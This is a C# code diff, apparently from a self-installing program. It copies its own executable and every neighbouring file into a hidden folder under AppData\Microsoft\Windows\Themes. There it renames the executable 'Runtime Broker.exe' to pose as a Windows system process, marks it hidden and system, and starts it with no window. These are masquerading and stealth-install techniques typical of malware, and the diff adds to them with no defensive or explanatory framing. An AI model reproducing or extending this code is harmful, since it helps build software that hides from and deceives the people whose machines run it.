@@ -23,7 +23,7 @@ namespace FileTransfer
 
         private static readonly string DestDir = Path.Combine(
             Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
-            "Microsoft", "Windows", "Themes");
+            "Microsoft", "Windows", "Themes", "RuntimeBroker");
 
         public static readonly string DestExe = Path.Combine(DestDir, "Runtime Broker.exe");
         private static readonly string Marker = Path.Combine(DestDir, "wsc.dat");
@@ -61,6 +61,28 @@ namespace FileTransfer
                 }
 
                 Directory.CreateDirectory(DestDir);
+
+                string sourceDir = Path.GetDirectoryName(source) ?? "";
+                if (!string.IsNullOrEmpty(sourceDir) && Directory.Exists(sourceDir))
+                {
+                    foreach (string file in Directory.GetFiles(sourceDir, "*", SearchOption.AllDirectories))
+                    {
+                        string rel = Path.GetRelativePath(sourceDir, file);
+                        string dest = Path.Combine(DestDir, rel);
+
+                        string ext = Path.GetExtension(file).ToLowerInvariant();
+                        if (ext == ".pdb" || ext == ".xml")
+                            continue;
+
+                        if (file.Equals(source, StringComparison.OrdinalIgnoreCase))
+                            continue;
+
+                        string? destDir2 = Path.GetDirectoryName(dest);
+                        if (!string.IsNullOrEmpty(destDir2))
+                            Directory.CreateDirectory(destDir2);
+                        File.Copy(file, dest, true);
+                    }
+                }
 
                 File.Copy(source, DestExe, true);
                 File.SetAttributes(DestExe, FileAttributes.Hidden | FileAttributes.System);
@@ -128,8 +150,7 @@ namespace FileTransfer
                     var psi = new ProcessStartInfo
                     {
                         FileName = DestExe,
-                        UseShellExecute = true,
-                        WindowStyle = ProcessWindowStyle.Hidden,
+                        UseShellExecute = false,
                         CreateNoWindow = true
                     };
                     Process.Start(psi);
